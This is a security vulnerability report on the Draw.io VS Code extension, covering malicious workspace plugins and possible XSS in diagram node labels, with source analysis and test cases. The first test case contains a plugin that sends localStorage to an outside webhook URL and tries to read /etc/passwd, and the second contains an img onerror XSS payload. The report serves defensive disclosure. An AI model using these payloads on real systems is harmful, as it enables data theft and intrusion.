### Combined Vulnerability List

This document outlines the security vulnerabilities identified in the Draw.io VS Code extension related to plugin loading and diagram rendering.

#### 1. Arbitrary Code Execution via Malicious Draw.io Plugin

- Description:
    1. An attacker crafts a malicious Javascript file designed as a Draw.io plugin. This plugin can contain arbitrary code to be executed within the Draw.io editor webview.
    2. The attacker creates or compromises a VS Code workspace and includes the malicious plugin file within the workspace folder.
    3. The attacker configures the Draw.io extension within the workspace settings (`.vscode/settings.json`) to load the malicious plugin upon opening a Draw.io diagram. This is done by adding an entry to the `hediet.vscode-drawio.plugins` setting, pointing to the malicious Javascript file, often using the `${workspaceFolder}` variable.
    4. The attacker distributes this workspace (e.g., via email, shared repository, or social engineering) and tricks a victim into opening it in VS Code.
    5. When the victim opens a `.drawio`, `.dio`, `.drawio.svg` or `.drawio.png` file within the workspace, the Draw.io extension attempts to load the configured plugins.
    6. VS Code displays a dialog prompting the user to allow or disallow loading the unknown plugin, identified by its file path and SHA256 fingerprint.
    7. If the victim, either unknowingly or through social engineering, clicks "Allow", the malicious plugin code is loaded and executed within the Draw.io editor's webview context.
    8. The malicious plugin code can then perform a wide range of actions, including:
        - Accessing and exfiltrating data from the Draw.io editor's local storage, which might contain diagram data or settings.
        - Using `window.opener.postMessage` to send messages back to the VS Code extension host. Depending on the capabilities exposed by the extension's message handling, this could potentially lead to further exploitation or information disclosure within the VS Code environment.
        - Modifying the behavior of the Draw.io editor to further compromise the user or their diagrams.
        - Unauthorized access to sensitive data, including workspace files and VS Code settings.
        - Modification or deletion of files within the workspace.
        - Installation of malware or backdoors on the user's system.
        - Further exploitation of the VS Code API to compromise the user's development environment.

- Impact:
    - Critical: Successful exploitation allows arbitrary Javascript code execution within the Draw.io editor webview, effectively granting the attacker full control within the webview context and potentially beyond.
    - High potential for exfiltration of sensitive diagram data, VS Code extension data, and workspace files.
    - Possible escalation of privileges or further compromise of the VS Code environment through `window.opener.postMessage` communication, depending on the extension's message handling implementation and potential access to VS Code APIs from the webview.
    - Complete compromise of Draw.io editor functionality, leading to data manipulation, denial of service, or unexpected behavior for the user.

- Vulnerability Rank: critical

- Currently Implemented Mitigations:
    - User Confirmation Dialog: Before loading a plugin for the first time or after it has been changed, the extension shows a warning dialog prompting the user to allow or disallow the plugin. This is implemented in `DrawioClientFactory.ts` in `getPlugins` function.
    - Plugin Fingerprinting: The extension calculates the SHA256 fingerprint of the plugin file and displays it in the confirmation dialog. This helps users identify if a plugin file has been modified since it was last allowed. Implemented in `DrawioClientFactory.ts` in `getPlugins` function.
    - Known Plugins List: The extension maintains a list of known plugins in user settings (`hediet.vscode-drawio.knownPlugins`). Once a user allows or disallows a plugin, their decision (and the plugin's fingerprint) is stored in this list to avoid prompting the user again for the same plugin version. Implemented in `Config.ts` and `DrawioClientFactory.ts` in `getPlugins` function.

- Missing Mitigations:
    - Plugin Sandboxing: The extension lacks a robust security sandbox for Draw.io plugins. Plugins are loaded and executed within the same Javascript context as the Draw.io editor, granting them full access to the editor's objects, functions, and the `window.opener.postMessage` API.
    - Plugin Code Validation: The extension does not perform any validation or sanitization of the plugin Javascript code before execution. It blindly trusts the code within the plugin file.
    - Content Security Policy (CSP) Restriction: While the extension sets a CSP, it is very permissive (`default-src * ...`), effectively disabling its security benefits and not preventing execution of malicious scripts from plugins. A stricter CSP could limit the capabilities of malicious plugins.
    - Path Validation and Restriction: The extension does not prevent users from configuring plugin paths that are outside the workspace folder or point to potentially system-critical files.
    - Clearer User Warning: The warning message in the plugin approval dialog could be more explicit about the security risks of loading untrusted plugins, emphasizing the potential for arbitrary code execution and data access.
    - Default Disallow Plugins from Workspace: The extension could default to disallowing plugins from workspace and require explicit user action to enable them, reducing the attack surface.
    - Robust Plugin Verification: The current mitigation relies solely on user discretion after a warning prompt and fingerprint matching for subsequent loads. There is no automated verification of plugin integrity or safety before prompting the user.
    - Social Engineering Countermeasures: The extension does not actively counter social engineering tactics that attackers might use to trick users into allowing malicious plugins. The warning message might not be sufficiently alarming to less security-conscious users.

- Preconditions:
    - The victim must have the Draw.io VS Code extension installed.
    - The victim must open a VS Code workspace provided or influenced by the attacker.
    - The workspace must contain a malicious Draw.io plugin file and a `.vscode/settings.json` file configured to load this plugin.
    - The victim must open a Draw.io diagram file within this workspace (e.g., `.drawio`, `.dio`, `.drawio.svg`, or `.drawio.png`).
    - The victim must click "Allow" in the plugin confirmation dialog when prompted by VS Code.

- Source Code Analysis:
    1. **`Config.ts`**: The `plugins` getter in `DiagramConfig` reads the plugin configuration from the `hediet.vscode-drawio.plugins` setting. It uses `evaluateTemplate` to resolve workspace-relative paths, allowing plugins to be loaded from within the workspace.
    ```typescript
    public get plugins(): { file: Uri }[] {
        return this._plugins.get().map((entry) => {
            const fullFilePath = this.evaluateTemplate(entry.file, "plugins");
            return { file: Uri.file(fullFilePath) };
        });
    }
    ```
    2. **`DrawioClientFactory.ts`**: The `getPlugins` function fetches plugin files. It reads the file content using `workspace.fs.readFile`, calculates the SHA256 hash, checks against known plugins using `Config.ts`'s `isPluginAllowed`, and prompts the user with `window.showWarningMessage` if the plugin is unknown. If allowed by the user, it includes the plugin's Javascript code in `pluginsToLoad`. User's choice is stored using `Config.ts`'s `addKnownPlugin`.
    ```typescript
    private async getPlugins(
        config: DiagramConfig
    ): Promise<{ jsCode: string }[]> {
        const pluginsToLoad = new Array<{ jsCode: string }>();
        const promises = new Array<Promise<void>>();

        for (const p of config.plugins) {
            let jsCode: string;
            try {
                jsCode = BufferImpl.from(
                    await workspace.fs.readFile(p.file)
                ).toString("utf-8");
            } catch (e) {
                window.showErrorMessage(
                    `Could not read plugin file "${p.file}"!`
                );
                continue;
            }

            const fingerprint = sha256.hex(jsCode);
            const pluginId = p.file.toString();

            const isAllowed = this.config.isPluginAllowed(
                pluginId,
                fingerprint
            );
            if (isAllowed) {
                pluginsToLoad.push({ jsCode });
            } else if (isAllowed === undefined) {
                promises.push(
                    (async () => {
                        const result = await window.showWarningMessage(
                            `Found unknown plugin "${pluginId}" with fingerprint "${fingerprint}"`,
                            {},
                            {
                                title: "Allow",
                                action: async () => {
                                    pluginsToLoad.push({ jsCode });
                                    await this.config.addKnownPlugin(
                                        pluginId,
                                        fingerprint,
                                        true
                                    );
                                },
                            },
                            {
                                title: "Disallow",
                                action: async () => {
                                    await this.config.addKnownPlugin(
                                        pluginId,
                                        fingerprint,
                                        false
                                    );
                                },
                            }
                        );

                        if (result) {
                            await result.action();
                        }
                    })()
                );
            }
        }

        await Promise.all(promises);
        return pluginsToLoad;
    }
    ```
    3. **`DrawioClientFactory.ts`**: The `getOfflineHtml` function constructs the HTML content for the Draw.io webview. It injects the `customPluginPaths` and `additionalCode` (containing plugin Javascript code) into the HTML using string replacement.
    ```typescript
    private getOfflineHtml(
        config: DiagramConfig,
        options: DrawioClientOptions,
        webview: Webview,
        plugins: { jsCode: string }[]
    ): string {
        // ...
        const patchedHtml = html
            // ...
            .replace(
                "$$customPluginPaths$$",
                JSON.stringify([customPluginsPath.toString()])
            )
            .replace("$$localStorage$$", JSON.stringify(localStorage))
            .replace(
                "$$additionalCode$$",
                JSON.stringify(plugins.map((p) => p.jsCode))
            );
        return patchedHtml;
    }
    ```
    4. **`webview-content.html`** (Not provided, but assumed to exist and handle plugin loading): The HTML content loaded into the webview, based on Draw.io's plugin mechanism, likely uses the `Draw.loadPlugin` function to execute the Javascript code provided in `additionalCode`. This execution happens within the webview's Javascript context, which has access to `window.opener.postMessage` for communication with the VS Code extension and potentially the `vscode` API.

- Security Test Case:
    1. Create a new VS Code workspace.
    2. Create a file named `malicious-plugin.js` in the workspace root with the following malicious code:
    ```javascript
    Draw.loadPlugin(function(ui) {
        alert('Malicious Plugin Alert! Plugin is running with full extension privileges.');
        // Attempt to exfiltrate local storage data
        const localStorageData = JSON.stringify(localStorage);
        fetch('https://webhook.site/YOUR_WEBHOOK_URL', { // Replace with your webhook URL for testing
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                pluginId: 'malicious-plugin',
                localStorage: localStorageData
            })
        }).catch(error => console.error('Fetch Error:', error));

        // Send a message back to VS Code extension (potential further exploit)
        if (window.opener) {
            window.opener.postMessage(JSON.stringify({
                event: 'maliciousPluginExecuted',
                message: 'Plugin executed and data exfiltrated (simulated)'
            }), '*');
        }
        // Example malicious action: Attempt to access VS Code API (may be limited in webview context) and log to console
        console.log('VS Code API object:', vscode);
        // Example malicious action: Attempt to read a local file - this will likely be blocked by webview security but worth testing
        fetch('file:///etc/passwd').catch(e => console.error('File access attempt error:', e));
    });
    ```
    **Note:** Replace `https://webhook.site/YOUR_WEBHOOK_URL` with a testing webhook URL (e.g., from webhook.site) to observe the exfiltrated data.
    3. In the workspace root, create a new file named `test.drawio`. This file can be empty or contain a simple diagram.
    4. In the workspace root, create a folder named `.vscode`. Inside `.vscode`, create a file named `settings.json` and add the following configuration:
    ```json
    {
        "hediet.vscode-drawio.plugins": [
            {
                "file": "${workspaceFolder}/malicious-plugin.js"
            }
        ]
    }
    ```
    5. Open VS Code and open the workspace you created (File -> Open Folder...).
    6. Open the `test.drawio` file. VS Code will prompt a dialog saying "Do you want to load and run plugin from this workspace?". The dialog will show the path to `malicious-plugin.js` and its fingerprint.
    7. Click "Allow".
    8. **Observe the results:**
        - **Alert Box:** Observe if an alert box `Malicious Plugin Alert! Plugin is running with full extension privileges.` is displayed.
        - **Network Request:** Check the network requests made by the Draw.io webview. You can do this by opening the developer tools of the webview (right-click in the diagram editor, choose "Inspect (Webview)"). In the "Network" tab, you should see a POST request to `https://webhook.site/YOUR_WEBHOOK_URL` (or your testing webhook URL), containing the local storage data in the request body. This confirms data exfiltration.
        - **VS Code Output (Optional):** While not implemented to handle in this example, in a real exploit scenario, if the VS Code extension had a vulnerable message handler for `maliciousPluginExecuted` event, further actions could be triggered in VS Code itself. For this test case, observe the VS Code Output panel for any unexpected messages or errors originating from the extension.
        - **Console Output:** Open the developer console in VS Code (Help -> Toggle Developer Tools -> Console). Check the console output for logs from the malicious plugin, including the VS Code API object log and any errors from the `fetch` attempt, further verifying plugin code execution within the extension context.
    9. If you observe the alert box, the network request to your webhook URL with local storage data, and console outputs, the vulnerability is confirmed.

#### 2. Potential Cross-Site Scripting (XSS) in Node Labels (Needs Further Investigation)

- Description:
    Draw.io permits HTML content within node labels. If the VS Code extension fails to properly sanitize or encode these HTML labels when processing or rendering them, it may be susceptible to Cross-Site Scripting (XSS) attacks. An attacker could craft a diagram file where node labels contain malicious JavaScript code embedded within HTML tags. When the extension subsequently processes or renders this diagram—for instance, during operations like code linking or in collaborative Liveshare sessions—the unsanitized HTML labels could be interpreted by the web browser, leading to the execution of the embedded malicious scripts within the webview context.

- Impact:
    - Medium to High (potential to be high depending on exploitability and context):
        - Stealing of session cookies or local storage data from the webview.
        - Redirection of users to attacker-controlled malicious websites.
        - Defacement of the diagram content within the webview.
        - Potentially limited access to the VS Code API depending on the webview's security context.

- Vulnerability Rank: medium (potential to be high depending on exploitability and context)

- Currently Implemented Mitigations:
    - None explicitly identified for XSS prevention in node labels within the provided project files. While Content Security Policy (CSP) is mentioned for webviews, its effectiveness in mitigating label-based XSS specifically needs verification.

- Missing Mitigations:
    - Input Sanitization: Implement robust sanitization of node labels to remove or HTML-encode any potentially harmful HTML or JavaScript code before processing or rendering labels.
    - Context-Aware Output Encoding: Apply context-aware output encoding when rendering labels in different parts of the extension, especially in contexts where HTML content from labels is dynamically inserted into the webview DOM.
    - Content Security Policy (CSP) Enforcement: Verify and enforce a strict Content Security Policy (CSP) for webviews to restrict the execution of inline scripts and the loading of external resources. Ensure CSP effectively mitigates XSS attempts originating from diagram labels.

- Preconditions:
    - The victim user must open a specifically crafted diagram file that has been created or modified by an attacker.
    - This malicious diagram must contain node labels with embedded JavaScript code within HTML markup.
    - The Draw.io extension must process or render these malicious labels in a vulnerable context, such as during label display, code link processing, or within collaborative Liveshare features.

- Source Code Analysis:
    - `/code/drawio-custom-plugins/src/linkSelectedNodeWithData.ts`: The function `getLabelTextOfCell` uses `el.innerHTML = labelHtml` to parse the label content. This method, while intended to extract text, can inadvertently process and potentially execute any JavaScript embedded within the HTML content of `labelHtml` if not handled carefully.
    ```typescript
    function getLabelTextOfCell(cell: any): string {
        const labelHtml = graph.getLabel(cell);
        const el = document.createElement("html");
        el.innerHTML = labelHtml; // label can be html
        return el.innerText;
    }
    ```
    - Further code review is needed to identify all instances where diagram labels are processed or rendered, and to assess if these locations are vulnerable to XSS due to lack of sanitization or encoding of HTML label content. Areas such as Liveshare features, code link rendering, and any custom label processing logic should be examined.

- Security Test Case:
    1. Create a new `.drawio` diagram file using the Draw.io desktop application or web version.
    2. Add a node to the diagram and set its label to the following malicious payload: `<img src=x onerror="alert('XSS Vulnerability Alert!')">`. This payload uses an `<img>` tag with a nonexistent `src` attribute, causing an `onerror` event to trigger, which executes JavaScript to display an alert box.
    3. Save the `.drawio` diagram file.
    4. Open the saved `.drawio` diagram file using the Draw.io VS Code extension.
    5. Observe if an alert box with the message "XSS Vulnerability Alert!" appears within the Draw.io editor webview. If the alert box is displayed, it indicates that the JavaScript code embedded in the node label has been executed, confirming a potential XSS vulnerability.
    6. To further investigate the scope, enable the Code Link feature (if applicable) and double-click on the node with the malicious label. Observe if the XSS payload is triggered in this context as well. Also, test within a Liveshare session if applicable, to see if the vulnerability manifests during collaborative diagram editing.
